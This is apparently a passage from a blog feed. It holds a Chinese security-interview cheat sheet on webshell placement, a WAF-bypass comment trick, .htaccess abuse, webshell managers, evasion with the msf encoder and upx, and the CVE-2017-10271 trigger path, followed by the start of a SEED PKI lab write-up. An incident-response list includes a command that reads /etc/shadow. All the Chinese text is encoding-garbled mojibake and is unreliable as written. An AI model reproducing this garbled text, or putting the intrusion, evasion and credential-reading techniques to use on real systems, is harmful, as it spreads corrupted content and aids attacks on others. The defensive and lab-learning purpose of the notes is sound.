Invocationï¼‰æ˜¯Javaä¸­çš„ä¸€ç§æœºåˆ¶ï¼Œç”¨äºå®ç°è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆRPCï¼‰ã€‚å®ƒå…è®¸åœ¨ä¸åŒçš„Javaè™šæ‹Ÿæœºï¼ˆJVMï¼‰ä¹‹é—´è¿›è¡Œé€šä¿¡ï¼Œå¹¶ä½¿å¾—åœ¨ä¸€ä¸ªJVMä¸­çš„Javaå¯¹è±¡èƒ½å¤Ÿè°ƒç”¨åœ¨å¦ä¸€ä¸ªJVMä¸­çš„Javaå¯¹è±¡çš„æ–¹æ³•ï¼Œå°±åƒåœ¨æœ¬åœ°è°ƒç”¨ä¸€æ ·ã€‚RMIæ˜¯Javaå¹³å°çš„ä¸€éƒ¨åˆ†ï¼Œæä¾›äº†ä¸€ç§ç®€å•çš„æ–¹æ³•æ¥å®ç°åˆ†å¸ƒå¼åº”ç”¨ç¨‹åºã€‚</p><h1 id="åº”æ€¥å“åº”"><a href="#åº”æ€¥å“åº”" class="headerlink" title="åº”æ€¥å“åº”"></a>åº”æ€¥å“åº”</h1><p>1.æ”¶é›†å®¢æˆ·æœºå™¨ä¿¡æ¯ä»¥åŠæ ·æœ¬ï¼Œåšå¥½æ–‡ä»¶å¤‡ä»½</p><p>2.åˆ¤æ–­å®‰å…¨äº‹ä»¶çš„ç±»å‹ï¼Œæ˜¯ç³»ç»Ÿå±‚é¢çš„ï¼Œå¦‚æŒ–çŸ¿ç—…æ¯’ã€åé—¨æœ¨é©¬ï¼Œè¿˜æ˜¯ç½‘ç»œåº”ç”¨å±‚é¢çš„ï¼Œå¦‚webshellï¼Œæˆ–è€…æ˜¯ç½‘ç»œå±‚é¢ï¼Œå¦‚æ–­ç½‘ã€DDOSç­‰</p><p>3.éš”ç¦»æœºå™¨</p><p>4.æ—¥å¿—ã€ç”¨æˆ·ã€è¿›ç¨‹ã€å¯åŠ¨é¡¹ã€æ ·æœ¬ï¼Œçœ‹åˆ°å¯ç–‘çš„å°±æ€æ‰ï¼Œåˆ æ–‡ä»¶ï¼Œæ‰“è¡¥ä¸ï¼Œæº¯æº</p><p>5.äº§å‡ºä¸€ä»½å®‰å…¨äº‹ä»¶æŠ¥å‘Š</p><ul><li>å°†ç±»ä¼¼%WINDIR%System32ç›®å½•è¿›è¡Œæ—¶é—´é¡ºåºæ’æŸ¥</li><li>æŸ¥çœ‹ç½‘ç»œã€ç«¯å£ï¼šnetstat -anoã€ps -efã€netstat -antlp</li><li>æŸ¥çœ‹ç™»å½•ç”¨æˆ·ï¼šwho</li><li>æŸ¥çœ‹è´¦æˆ·ã€ç”¨æˆ·ä¿¡æ¯ï¼šcat /etc/passwd /etc/shadow /etc/group</li><li>lastlog # æœ€è¿‘ç™»å½•æ—¥å¿—</li><li>crontal -læŸ¥çœ‹è®¡åˆ’ä»»åŠ¡</li><li>topæŸ¥çœ‹CPUåˆ©ç”¨</li><li>historyæŸ¥çœ‹å†å²å‘½ä»¤</li></ul><h1 id="æ‚é¡¹"><a href="#æ‚é¡¹" class="headerlink" title="æ‚é¡¹"></a>æ‚é¡¹</h1><p><strong>å¦‚ä½•å‘æœåŠ¡å™¨å†™å…¥webshell</strong></p><p>ä»¥ä¸‹æ˜¯ä¸€äº›å¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨çš„ WebShell å†™å…¥æ–¹å¼ï¼š</p><ol><li>æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼šå¦‚æœ Web åº”ç”¨ç¨‹åºå­˜åœ¨ä¸Šä¼ æ–‡ä»¶çš„åŠŸèƒ½ï¼Œè€Œä¸Šä¼ æ–‡ä»¶æœªç»è¿‡ä¸¥æ ¼çš„éªŒè¯å’Œè¿‡æ»¤ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥ä¸Šä¼ å¸¦æœ‰ WebShell çš„æ–‡ä»¶åˆ°æœåŠ¡å™¨ã€‚</li><li>SQL æ³¨å…¥ï¼šå¦‚æœ Web åº”ç”¨ç¨‹åºå­˜åœ¨ SQL æ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ³¨å…¥çš„æ–¹å¼æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æˆ–å†™å…¥ WebShell åˆ°æœåŠ¡å™¨ä¸Šã€‚</li></ol><p><strong>/<em>!</em>/ä¸ºä»€ä¹ˆèƒ½ç»•è¿‡waf</strong></p><ul><li>â€œ/<em>!</em>/â€œ å¯ä»¥ä½¿ WAF æ— æ³•ç›´æ¥è¯†åˆ«å‡ºè¯­å¥ä¸­åŒ…å«äº† â€œUNION SELECTâ€ å…³é”®å­—ï¼Œä»è€Œç»•è¿‡ç®€å•çš„ SQL æ³¨å…¥è§„åˆ™æ£€æµ‹ã€‚</li></ul><p>æ‹¿åˆ°ä¸€ä¸ªwebshellå‘ç°ç½‘ç«™æ ¹ç›®å½•ä¸‹æœ‰.htaccessæ–‡ä»¶ï¼Œæˆ‘ä»¬èƒ½åšä»€ä¹ˆï¼Ÿ</p><blockquote><p>.htaccess æ˜¯ Apache Web æœåŠ¡å™¨é…ç½®æ–‡ä»¶çš„ä¸€ç§ï¼Œç”¨äºä¸ºç‰¹å®šç›®å½•ä¸‹çš„ç½‘ç«™é…ç½®å±æ€§ã€æƒé™ã€é‡å®šå‘ã€é”™è¯¯å¤„ç†ç­‰è§„åˆ™</p></blockquote><ul><li>éšè— WebShellï¼šæ”»å‡»è€…å¯èƒ½ä¼šä¿®æ”¹ .htaccess æ–‡ä»¶ï¼Œå°† WebShell çš„è®¿é—®æƒé™é™åˆ¶åªå…è®¸ç‰¹å®šçš„ IP åœ°å€æˆ–åŸŸåè®¿é—®ï¼Œé˜²æ­¢å…¶å®ƒäººé€šè¿‡å…¬ç½‘è®¿é—®åˆ°è¯¥ Shellã€‚</li><li>é‡å®šå‘æ”»å‡»ï¼šæ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡ä¿®æ”¹ .htaccess æ–‡ä»¶æ¥è¿›è¡Œé‡å®šå‘æ”»å‡»ï¼Œå°†ç”¨æˆ·è¯·æ±‚é‡å®šå‘åˆ°æ¶æ„çš„ç½‘ç«™æˆ–é¡µé¢ä¸Šï¼Œä»¥çªƒå–ç”¨æˆ·ä¿¡æ¯æˆ–ä¼ æ’­æ¶æ„è½¯ä»¶ã€‚</li></ul><p>åˆ¤æ–­å‡ºç½‘ç«™çš„CMSï¼ˆå†…å®¹ç®¡ç†ç³»ç»Ÿï¼‰å¯¹æ¸—é€æµ‹è¯•æœ‰å¾ˆå¤§çš„æ„ä¹‰ï¼Œå› ä¸ºä¸åŒçš„CMSå¯èƒ½å­˜åœ¨ä¸åŒçš„å®‰å…¨æ¼æ´å’Œæ”»å‡»é¢ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›æ¼æ´æ¥å®æ–½æ”»å‡»</p><p>3389(è¿œç¨‹è¿æ¥)æ— æ³•è¿æ¥çš„å‡ ç§æƒ…å†µ</p><ul><li>é˜²ç«å¢™é˜»æ­¢è¿æ¥</li><li>ç½‘ç»œè¿æ¥é—®é¢˜</li><li>ç«¯å£è¢«å ç”¨</li><li>è¿œç¨‹æ¡Œé¢æœåŠ¡æœªå¯ç”¨</li></ul><p>æ¸—é€æµ‹è¯•å¦‚ä½•åˆ¤æ–­ç›®æ ‡æ“ä½œç³»ç»Ÿ</p><ul><li>æ“ä½œç³»ç»ŸæŒ‡çº¹è¯†åˆ«å·¥å…·</li><li>pingçš„TTLå€¼</li><li>æ¼æ´æ‰«æå·¥å…·ï¼ˆå¦‚OpenVASã€Nessusç­‰ï¼‰å¯ä»¥æ‰«æç›®æ ‡ä¸»æœºä¸Šå·²çŸ¥çš„æ¼æ´ï¼Œå¹¶æ ¹æ®æ¼æ´ç±»å‹å’Œå½±å“èŒƒå›´æ¥æ¨æ–­ç›®æ ‡æ“ä½œç³»ç»Ÿã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ¼æ´æ‰«æå·¥å…·æ£€æµ‹åˆ°ç›®æ ‡ä¸»æœºä¸Šå­˜åœ¨MS17-010æ¼æ´ï¼Œåˆ™å¯ä»¥æ¨æ–­ç›®æ ‡æ“ä½œç³»ç»Ÿä¸ºWindows</li><li>å¦‚æœWebåº”ç”¨ç¨‹åºè¿”å›çš„HTTPå“åº”å¤´ä¸­åŒ…å«â€œServer: Apache/2.4.7 (Ubuntu)â€ä¿¡æ¯ï¼Œåˆ™å¯ä»¥æ¨æ–­ç›®æ ‡æ“ä½œç³»ç»Ÿä¸ºUbuntu Linux</li></ul><p>èšå‰‘/èœåˆ€/Cåˆ€/å†°èçš„ç›¸åŒä¸ä¸ç›¸åŒä¹‹å¤„</p><ul><li>èšå‰‘/èœåˆ€/Cåˆ€/å†°èéƒ½æ˜¯ä¸€äº›å¸¸ç”¨çš„WebShellç®¡ç†å·¥å…·ï¼Œå®ƒä»¬å¯ä»¥å¸®åŠ©æ”»å‡»è€…åœ¨æ§åˆ¶äº†ç½‘ç«™åè¿›è¡Œæ–‡ä»¶æ“ä½œã€å‘½ä»¤æ‰§è¡Œã€æ•°æ®åº“ç®¡ç†ç­‰æ“ä½œ</li><li>ç›¸åŒä¹‹å¤„æ˜¯éƒ½éœ€è¦åœ¨ç›®æ ‡ç½‘ç«™ä¸Šæ¤å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åé€šè¿‡å®¢æˆ·ç«¯ä¸ä¹‹é€šä¿¡ï¼Œå‘é€åŠ å¯†æˆ–ç¼–ç åçš„æ•°æ®åŒ…ï¼Œæ‰§è¡Œç›¸åº”çš„åŠŸèƒ½</li><li>ä¸åŒä¹‹å¤„ä¸»è¦åœ¨äºåŠ å¯†æˆ–ç¼–ç æ–¹å¼ã€æµé‡ç‰¹å¾ã€åŠŸèƒ½æ¨¡å—ç­‰æ–¹é¢<ul><li>èœåˆ€æ˜¯æœ€æ—©çš„WebShellç®¡ç†å·¥å…·ï¼Œå®ƒä½¿ç”¨Base64ç¼–ç å’Œevalå‡½æ•°æ¥åŠ å¯†å’Œæ‰§è¡Œæ•°æ®åŒ…ï¼Œæµé‡ç‰¹å¾ä¸º@evalå’Œbase64_decodeã€‚</li><li>åŠŸèƒ½æ¨¡å—åŒ…æ‹¬æ–‡ä»¶ç®¡ç†ã€è™šæ‹Ÿç»ˆç«¯ã€æ•°æ®åº“ç®¡ç†ç­‰</li></ul></li><li>èšå‰‘æ˜¯ä¸€æ¬¾å¼€æºçš„è·¨å¹³å°WebShellç®¡ç†å·¥å…·ï¼Œå®ƒæ”¯æŒå¤šç§ç¼–ç å™¨å’ŒåŠ å¯†å™¨ï¼Œå¯ä»¥è‡ªå®šä¹‰æ•°æ®åŒ…æ ¼å¼ï¼Œæµé‡ç‰¹å¾è¾ƒéš¾è¢«æ£€æµ‹</li><li>å†°èæ˜¯ä¸€æ¬¾åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†çš„WebShellç®¡ç†å·¥å…·ï¼Œå®ƒä½¿ç”¨AESåŠ å¯†ç®—æ³•å’Œopensslå‡½æ•°æ¥åŠ å¯†å’Œè§£å¯†æ•°æ®åŒ…ï¼Œæµé‡ç‰¹å¾ä¸ºopenssl_decryptã€‚å®ƒçš„åŠŸèƒ½æ¨¡å—åŒ…æ‹¬æ–‡ä»¶ç®¡ç†ã€è™šæ‹Ÿç»ˆç«¯ã€æ•°æ®åº“ç®¡ç†ã€Socksä»£ç†ã€åå¼¹shellç­‰</li></ul><p>Windowså¸¸ç”¨çš„ææƒæ–¹æ³•</p><ul><li>å¼±å£ä»¤æˆ–æ¼æ´è¿›è¡Œææƒï¼Œå¦‚æ•°æ®åº“æœåŠ¡ã€WebæœåŠ¡ã€è¿œç¨‹æ¡Œé¢æœåŠ¡</li></ul><p>æ­£å‘ä»£ç†å’Œåå‘ä»£ç†çš„åŒºåˆ«</p><ul><li>æ­£å‘ä»£ç†æ˜¯ä»£ç†å®¢æˆ·ç«¯ï¼Œä¸ºå®¢æˆ·ç«¯æ”¶å‘è¯·æ±‚ï¼Œä½¿çœŸå®å®¢æˆ·ç«¯å¯¹æœåŠ¡å™¨ä¸å¯è§ï¼ˆVPNï¼šlocal-ã€‹proxy-ã€‹Googleï¼‰</li><li>åå‘ä»£ç†ä»£ç†æœåŠ¡ç«¯ï¼Œç”¨æˆ·å¹¶ä¸çŸ¥é“æœåŠ¡ç«¯æ˜¯å“ªä¸ªå‘æ¥çš„ï¼ˆæ‹¨æ‰“10086ï¼Œ10086å°±æ˜¯åå‘ä»£ç†ï¼Œæˆ‘ä»¬ä¸çŸ¥é“å®¢æœæ˜¯è°ï¼‰</li></ul><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202305052226209.png"></p><p>é±¼å‰æ”»å‡»æ˜¯ä¸€ç§é’ˆå¯¹ç‰¹å®šç›®æ ‡çš„ç½‘ç»œæ”»å‡»ï¼Œæ”»å‡»è€…é€šè¿‡ä¼ªè£…æˆå¯ä¿¡çš„å‘é€è€…ï¼Œå‘ç›®æ ‡å‘é€é’“é±¼é‚®ä»¶æˆ–ä¿¡æ¯ï¼Œè¯±éª—ç›®æ ‡ç‚¹å‡»æ¶æ„é“¾æ¥æˆ–ä¸‹è½½æ¶æ„é™„ä»¶ï¼Œä»è€Œè·å–ç›®æ ‡çš„æ•æ„Ÿä¿¡æ¯æˆ–æ§åˆ¶ç›®æ ‡çš„è®¡ç®—æœº</p><p>æ°´å‘æ”»å‡»æ˜¯ä¸€ç§é€šè¿‡æ¤å…¥æ¶æ„ä»£ç æˆ–ç¯¡æ”¹ç½‘ç«™ç­‰æ–¹å¼ï¼Œè¯±éª—ç›®æ ‡è®¿é—®æ¶æ„ç½‘ç«™æˆ–ä¸‹è½½æ¶æ„è½¯ä»¶ï¼Œä»è€Œè·å–ç›®æ ‡çš„æ•æ„Ÿä¿¡æ¯æˆ–æ§åˆ¶ç›®æ ‡çš„è®¡ç®—æœº</p><p>æœ¨é©¬å…æ€</p><ul><li><p>åœ¨metasploitæ¡†æ¶ä¸‹å…æ€çš„æ–¹å¼ä¹‹ä¸€æ˜¯msfç¼–ç å™¨ï¼ŒåŠŸèƒ½æ˜¯ä½¿ç”¨msfç¼–ç å™¨å¯¹æˆ‘ä»¬åˆ¶ä½œçš„æœ¨é©¬è¿›è¡Œé‡æ–°ç¼–ç ï¼Œç”Ÿæˆä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶è¿è¡Œåï¼Œmsfç¼–ç å™¨ä¼šå°†åŸå§‹ç¨‹åºè§£ç åˆ°å†…å­˜ä¸­å¹¶æ‰§è¡Œã€‚</p></li><li><p>upx fileï¼Œå¯¹fileæ–‡ä»¶è¿›è¡ŒåŠ å£³å¤„ç†</p></li></ul><p>å¦‚ä½•éªŒè¯æ˜¯å¦å­˜åœ¨CDNï¼šnslookupå‘½ä»¤</p><h1 id="Weblogic-XMLDecoder-ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-10271ï¼‰"><a href="#Weblogic-XMLDecoder-ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-10271ï¼‰" class="headerlink" title="Weblogic XMLDecoder ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-10271ï¼‰"></a>Weblogic XMLDecoder ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2017-10271ï¼‰</h1><blockquote><p>WLSï¼šweblogic server,wlsç»„ä»¶å¯¹å¤–æä¾›webserveræœåŠ¡</p></blockquote><p>è§¦å‘æ–¹å¼ï¼šè®¿é—®ip:port/wls-wsat/CoordinatorPortTypeï¼ŒæŠ“åŒ…ï¼Œä½¿ç”¨POSTä¼ é€’å‚æ•°</p><p>åŸç†ï¼šWeblogicâ€œwls-wsatâ€ç»„ä»¶åœ¨ååºåˆ—åŒ–æ“ä½œæ—¶ä½¿ç”¨äº†<strong>XMLDecoder</strong>ç±»è¿›è¡ŒXMLååºåˆ—åŒ–æ“ä½œå¼•å‘äº†ä»£ç æ‰§è¡Œ</p><p><a href="https://xz.aliyun.com/t/8465">https://xz.aliyun.com/t/8465</a></p><h1 id="å¸¸è§ä»£ç æ‰§è¡Œã€æ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°"><a href="#å¸¸è§ä»£ç æ‰§è¡Œã€æ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°" class="headerlink" title="å¸¸è§ä»£ç æ‰§è¡Œã€æ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°"></a>å¸¸è§ä»£ç æ‰§è¡Œã€æ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°</h1><ol><li>ä»£ç æ‰§è¡Œå‡½æ•°ï¼ševal()ã€Function()ã€setTimeout()ã€setInterval()ã€new Function()ç­‰ã€‚</li><li>æ–‡ä»¶è¯»å–å‡½æ•°ï¼šfile_get_contents()ã€fopen()ã€readfile()ã€file()ã€fgets()ç­‰ã€‚</li><li>å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼šexec()ã€system()ã€passthru()ã€shell_exec()ã€popen()ç­‰ã€‚</li></ol><h1 id="æœ‰ç”¨çš„githubé¡¹ç›®"><a href="#æœ‰ç”¨çš„githubé¡¹ç›®" class="headerlink" title="æœ‰ç”¨çš„githubé¡¹ç›®"></a>æœ‰ç”¨çš„githubé¡¹ç›®</h1><ul><li><a href="https://www.revshells.com/">Online - Reverse Shell Generator</a></li><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">GitHub - swisskyrepo/PayloadsAllTheThings: A list of useful payloads and bypass for Web Application Security and Pentest/CTF</a></li><li>åº”æ€¥å“åº”å®æˆ˜ç¬”è®° <a href="https://github.com/Bypass007/Emergency-Response-Notes">GitHub - Bypass007/Emergency-Response-Notes: åº”æ€¥å“åº”å®æˆ˜ç¬”è®°ï¼Œä¸€ä¸ªå®‰å…¨å·¥ç¨‹å¸ˆçš„è‡ªæˆ‘ä¿®å…»ã€‚</a></li></ul><h1 id="ä¸€äº›æ–‡ç« "><a href="#ä¸€äº›æ–‡ç« " class="headerlink" title="ä¸€äº›æ–‡ç« "></a>ä¸€äº›æ–‡ç« </h1><p><a href="https://www.wangan.com/p/7fy78403bdf27404">è“é˜Ÿé¢è¯•é¢˜æ•´ç†ï¼ˆé˜²å®ˆæ–¹é¢è¯•é¢˜æ•´ç†ï¼‰ - ç½‘å®‰</a></p><p><a href="http://www.tlcement.com/27237.html">2022å¹´è“é˜Ÿåˆçº§æŠ¤ç½‘é¢è¯•é¢˜æ€»ç»“-ç½‘ç»œçŸ¥è¯†</a></p><p> <a href="https://javasec.org/">æ”»å‡»Java Webåº”ç”¨-[Java Webå®‰å…¨]</a></p><p><a href="http://www.tlcement.com/27237.html">2022å¹´è“é˜Ÿåˆçº§æŠ¤ç½‘é¢è¯•é¢˜æ€»ç»“-ç½‘ç»œçŸ¥è¯†</a></p><ul><li><a href="https://websec.readthedocs.io/zh/latest/index.html">Webå®‰å…¨å­¦ä¹ ç¬”è®° â€” Webå®‰å…¨å­¦ä¹ ç¬”è®° 1.0 æ–‡æ¡£</a><ul><li>å†…ç½‘æ¸—é€ç« èŠ‚</li></ul></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-labï¼šPublic-Key Infrastructure (PKI) Lab</title>
    <link href="/p/135735d/"/>
    <url>/p/135735d/</url>
    
    <content type="html"><![CDATA[<p><img src="https://img.gls.show/img/202306241631184.png"></p><h1 id="Lab-Environment"><a href="#Lab-Environment" class="headerlink" title="Lab Environment"></a>Lab Environment</h1><p>ä¸‹è½½dockeræ–‡ä»¶ã€è§£å‹ã€è¿è¡Œdocker</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl https://seedsecuritylabs.org/Labs_20.04/Files/Crypto_PKI/Labsetup.zip --output pki.zip</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> unzip pki.zip</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> dcbuild <span class="hljs-comment"># docker-compose build</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> dcup <span class="hljs-comment"># docker-compose up</span></span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œdockerå¯èƒ½æ²¡æœ‰é€Ÿåº¦ï¼ŒæŠŠ/etc/docker/daemon.jsonæ–‡ä»¶å†™å…¥ä¸‹é¢çš„æºå³å¯</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># cat  <span class="hljs-regexp">/etc/</span>docker/daemon.json<br>&#123;<br>  <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<br>    <span class="hljs-string">&quot;https://hub-mirror.c.163.com&quot;</span>,<br>    <span class="hljs-string">&quot;https://mirror.baidubce.com&quot;</span><br>  ]<br>&#125;<br><br></code></pre></td></tr></table></figure><p>SEED VMå·²ç»æå‰åšå¥½äº†å‘½ä»¤æ›¿æ¢ ï¼Œå¯ä»¥çœ‹åˆ°.bashrcæœ‰å¦‚ä¸‹ä»£ç </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> Commands <span class="hljs-keyword">for</span> <span class="hljs-keyword">for</span> docker</span> <br>alias dcbuild=&#x27;docker-compose build&#x27;<br>alias dcup=&#x27;docker-compose up&#x27;<br>alias dcdown=&#x27;docker-compose down&#x27;<br>alias dockps=&#x27;docker ps --format &quot;&#123;&#123;.ID&#125;&#125;  &#123;&#123;.Names&#125;&#125;&quot;&#x27;<br>docksh() &#123; docker exec -it $1 /bin/bash; &#125;<br></code></pre></td></tr></table></figure><p>ç»™/etc/hostsæ–‡ä»¶å¢åŠ æ˜ å°„</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.9.0.80</span> www.gls23.com<br></code></pre></td></tr></table></figure><h1 id="Task-1-Becoming-a-Certificate-Authority-CA"><a href="#Task-1-Becoming-a-Certificate-Authority-CA" class="headerlink" title="Task 1: Becoming a Certificate Authority (CA)"></a>Task 1: Becoming a Certificate Authority (CA)</h1><blockquote><p>è¯ä¹¦é¢å‘æœºæ„(CA)æ˜¯é¢å‘æ•°å­—è¯ä¹¦çš„å¯ä¿¡å®ä½“ã€‚æ•°å­—è¯ä¹¦è¯æ˜è¯ä¹¦çš„æŒ‡å®šä¸»ä½“å¯¹å…¬é’¥çš„æ‰€æœ‰æƒã€‚è®¸å¤šå•†ä¸š CA è¢«è§†ä¸ºæ ¹ CA; VeriSign æ˜¯ç¼–å†™æœ¬æ–‡æ—¶æœ€å¤§çš„ CAã€‚å¸Œæœ›è·å¾—å•†ä¸š CA é¢å‘çš„æ•°å­—è¯ä¹¦çš„ç”¨æˆ·éœ€è¦å‘è¿™äº› CA æ”¯ä»˜è´¹ç”¨ã€‚</p><p>åœ¨è¿™ä¸ªå®éªŒå®¤ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºæ•°å­—è¯ä¹¦ã€‚æˆ‘ä»¬è‡ªå·±å°†æˆä¸ºä¸€ä¸ªæ ¹ CAï¼Œå¹¶ä¸ºè¿™ä¸ª CA ç”Ÿæˆä¸€ä¸ªè¯ä¹¦ã€‚ç„¶åä½¿ç”¨è¿™ä¸ª CA ä¸ºå…¶ä»– CA (ä¾‹å¦‚æœåŠ¡å™¨)é¢å‘è¯ä¹¦ã€‚</p><p>ä¸é€šå¸¸ç”±å¦ä¸€ä¸ª CA ç­¾åçš„å…¶ä»–è¯ä¹¦ä¸åŒï¼Œæ ¹ CA çš„è¯ä¹¦æ˜¯è‡ªç­¾åçš„ã€‚Root CA çš„è¯ä¹¦é€šå¸¸é¢„å…ˆåŠ è½½åˆ°å¤§å¤šæ•°æ“ä½œç³»ç»Ÿã€ Web æµè§ˆå™¨å’Œå…¶ä»–ä¾èµ– PKI çš„è½¯ä»¶ä¸­ã€‚æ ¹ CA çš„è¯ä¹¦æ˜¯æ— æ¡ä»¶å—ä¿¡ä»»çš„</p></blockquote><h2 id="é…ç½®æ–‡ä»¶-openssl-conf"><a href="#é…ç½®æ–‡ä»¶-openssl-conf" class="headerlink" title="é…ç½®æ–‡ä»¶ openssl.conf"></a>é…ç½®æ–‡ä»¶ openssl.conf</h2><blockquote><p>ä¸ºäº†ä½¿ç”¨ OpenSSL åˆ›å»ºè¯ä¹¦ï¼Œå¿…é¡»æœ‰ä¸€ä¸ªé…ç½®æ–‡ä»¶ã€‚</p><p>é…ç½®æ–‡ä»¶é€šå¸¸æœ‰ä¸€ä¸ªæ‰©å±•å.Cnfã€‚å®ƒç”±ä¸‰ä¸ª OpenSSL å‘½ä»¤ä½¿ç”¨: caã€ req å’Œ x509</p></blockquote><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒOpenSSL ä½¿ç”¨æ¥è‡ª/usr/lib/ssl/OpenSSL.cnf çš„é…ç½®æ–‡ä»¶ã€‚å› ä¸ºæˆ‘ä»¬éœ€è¦å¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œæ›´æ”¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†æŠŠå®ƒå¤åˆ¶åˆ°æˆ‘ä»¬çš„å·¥ä½œç›®å½•ä¸­ï¼Œå¹¶æŒ‡ç¤º OpenSSL ä½¿ç”¨è¿™ä¸ªå‰¯æœ¬ã€‚é…ç½®æ–‡ä»¶çš„[ CA default ]éƒ¨åˆ†æ˜¾ç¤ºäº†æˆ‘ä»¬éœ€è¦å‡†å¤‡çš„é»˜è®¤è®¾ç½®ã€‚</p><p>åœ¨ä½¿ç”¨ OpenSSL ç”Ÿæˆè¯ä¹¦æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ <code>-config</code> å‚æ•°æ¥æŒ‡å®šè¦ä½¿ç”¨çš„ <code>openssl.cnf</code> é…ç½®æ–‡ä»¶ã€‚è¯¥å‚æ•°å…è®¸ä½ æä¾›è‡ªå®šä¹‰çš„é…ç½®æ–‡ä»¶è·¯å¾„ã€‚</p><p>ä»¥ä¸‹æ˜¯ä½¿ç”¨ OpenSSL å‘½ä»¤ç”Ÿæˆè¯ä¹¦æ—¶æŒ‡å®š <code>openssl.cnf</code> æ–‡ä»¶çš„ç¤ºä¾‹å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">openssl req -new -config /path/to/openssl.cnf -keyout private.key -out csr.csr<br></code></pre></td></tr></table></figure><p>è¿›å…¥/usr/lib/sslçœ‹ä¸€ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/21/23]seed@VM:.../ssl$ ll<br>total 4<br>lrwxrwxrwx 1 root root   14 Nov 24  2020 certs -&gt; /etc/ssl/certs<br>drwxr-xr-x 2 root root 4096 Jul 31  2020 misc<br>lrwxrwxrwx 1 root root   20 Nov 24  2020 openssl.cnf -&gt; /etc/ssl/openssl.cnf<br>lrwxrwxrwx 1 root root   16 Nov 24  2020 private -&gt; /etc/ssl/private<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¸€ä¸‹openssl.cnfæ–‡ä»¶çš„å†…å®¹ï¼Œå¾ˆé•¿ï¼Œæˆ‘ä»¬å…³æ³¨ä¸€ä¸‹é…ç½®æ–‡ä»¶çš„[ CA default ]éƒ¨åˆ†ï¼Œå®ƒæ˜¾ç¤ºäº†æˆ‘ä»¬éœ€è¦å‡†å¤‡çš„é»˜è®¤è®¾ç½®</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs clean">####################################################################<br>[ CA_default ]<br><br>dir             = ./demoCA              # Where everything is kept<br>certs           = $dir/certs            # Where the issued certs are kept<br>crl_dir         = $dir/crl              # Where the issued crl are kept<br>database        = $dir/index.txt        # database index file.<br>unique_subject  = no                    # Set to <span class="hljs-string">&#x27;no&#x27;</span> to allow creation <span class="hljs-keyword">of</span><br>                                        # several certs <span 